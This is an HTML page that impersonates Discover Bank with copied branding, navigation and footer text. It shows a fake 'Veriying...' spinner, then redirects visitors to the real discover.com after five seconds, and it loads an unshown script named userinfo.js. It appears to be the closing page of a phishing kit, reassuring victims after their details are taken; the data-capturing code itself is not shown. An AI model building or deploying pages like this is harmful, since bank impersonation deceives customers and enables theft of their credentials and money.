<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Credit Cards, Banking & Loans - Discover</title>
    <link rel="stylesheet" href="./styles/index.css" />
    <link rel="shortcut icon" href="./favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./styles/userinfo.css" />
  </head>

  <body>
    <main>
      <header class="header">
        <div>
          <img
            src="./assets/discover-logo.svg"
            alt=""
            height="100"
            width="100"
          />
        </div>
        <div class="header-nav-bar">
          <select name="" id="">
            <option value="">All Products</option>
            <option value=""></option>
            <option value=""></option>
            <option value=""></option>
          </select>
          <small> Help and Resources</small>
          <small style="display: flex; align-items: center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="#000"
              height="1em"
              viewBox="0 0 512 512"
              style="margin-right: 5px"
            >
              <!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. -->
              <path
                d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"
              />
            </svg>
            search
          </small>
          <!-- <label for="id">Log In </label> -->
        </div>
      </header>
      <div style="margin-bottom:60vh" class="money-work">
        <h1 style="padding: 5px 30px;">
          Veriying<sapn id="cont">.</sapn>
        </h1>
      </div>
      <div class="spinner">
        <img src="./assets/spinner.gif" alt="">

      </div>

      </div>
      <h4 class="action-footer">
        The Contactless Symbol is a trademark owned by and used with permission
        of EMVCo, LLC
      </h4>
      <div class="footer-actions">
        <h4>Products & Services</h4>
        <h4>About Our Company</h4>
        <h4>Resources & Legal</h4>
        <h4>Quick Links</h4>
        <!-- first line -->
        <p>Credit Cards</p>
        <p>About Discover</p>
        <p>Card Smarts</p>
        <p>Mobile App</p>
        <!-- second line -->
        <p>Online Banking</p>
        <p>Contact Us</p>
        <p>Modern Money</p>
        <p>Refer a Friend</p>
        <!-- third line -->
        <p>Personal Loans</p>
        <p>ESG</p>
        <p>Personal Loan Resources</p>
        <p>ATM Locator</p>
        <!-- fouth line -->
        <p>Student Loans</p>
        <p>Investor Relations</p>
        <p>Home Loan Resources</p>
        <p>Sitemap</p>
        <!-- fifth line -->
        <p>Student Loans</p>
        <p>Investor Relations</p>
        <p>Home Loan Resources</p>
        <p>Sitemap</p>
        <!-- sixth line -->
        <p>Home Equity Loans</p>
        <p>Newsroom</p>
        <p>College Planning</p>
        <p>Language Services</p>
        <!-- seventh line -->
        <p>Mortgage Refinance</p>
        <p>Accept Discover</p>
        <p>Privacy</p>
        <p>Accesibility</p>
        <!-- eighth line -->
        <p>Diners Club International</p>
        <p>Diversity & Inclusion</p>
        <p>Security</p>
        <p>Browser Support</p>
        <!-- ninth line -->
        <p>PULSE</p>
        <p>Discover Technology</p>
        <p>Terms of Use</p>
        <p>AdChoices</p>
        <!-- ninth line -->
        <p></p>
        <p></p>
        <p>Cardmember Agreement</p>
        <p>Careers</p>
      </div>
      <footer class="main-footer">
        <img src="./assets/Facebook.webp" alt="" />
        <img src="./assets/Twitter.webp" alt="" />
        <img src="./assets/Instagram.webp" alt="" />
        <img src="./assets/linkedin.webp" alt="" />
        <samll> ©2023 Discover Bank, Member FDIC</samll>
        <img src="./assets/footer-icon-house.webp" alt="" />
        <img src="./assets/footer-icon-accredit.webp" alt="" />
        <img src="./assets/footer-icon-member.webp" alt="" />
      </footer>
      <script>
        const cont = document.getElementById("cont")
        const dot1 = ".";
        const dot2 = "..";
        const dot3 = "...";
        let  content = "";
        setInterval(()=>{
          const length = cont.textContent.length;
          if(length == 1) cont.textContent = dot2;
          if(length == 2) cont.textContent = dot3;
          if(length == 3) cont.textContent = dot1;

          
        }, 1000);

        setTimeout(()=>{
          window.location.href = "https://discover.com";
        } ,5000);
      </script>
    </main>
    <script src="./userinfo.js"></script>
  </body>
</html>
